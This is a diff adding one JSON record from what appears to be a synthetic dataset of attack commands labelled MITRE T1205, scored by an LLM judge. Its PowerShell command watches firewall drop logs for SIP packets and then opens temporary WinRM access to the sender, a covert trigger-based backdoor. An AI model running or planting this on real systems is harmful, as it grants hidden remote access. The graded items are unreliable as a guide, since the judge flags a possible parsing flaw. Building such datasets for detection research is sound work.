@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+5060\\b') { $src=$matches[1]; $name=\"sip-winrmhttps-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Uses unexpected SIP discovery traffic (UDP/5060) as a signal to enable WinRM over HTTPS (5986) for the sender IP.",
+  "rationale_steps": [
+    "Enable firewall dropped packet logging",
+    "Monitor for inbound UDP/5060 packets to the host",
+    "Open a temporary TCP/5986 rule for the signaling IP",
+    "Remove the rule after 5 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-abcea31b",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and valid parameters, though the Start-Job scriptblock is missing a statement separator after param($n) which may cause parsing issues on some versions.",
+        "semantic_score": 3,
+        "semantic_justification": "The logic matches Traffic Signaling by using UDP/5060 drops as a trigger to temporarily open WinRM HTTPS to the source IP, but it unrealistically claims no privileges despite requiring administrative rights for firewall changes and assumes WinRM is preconfigured and accessible via Invoke-Command to localhost.",
+        "combined_score": 3.5,
+        "confidence": 0.79,
+        "timestamp": "2025-10-01T18:53:40.814525Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
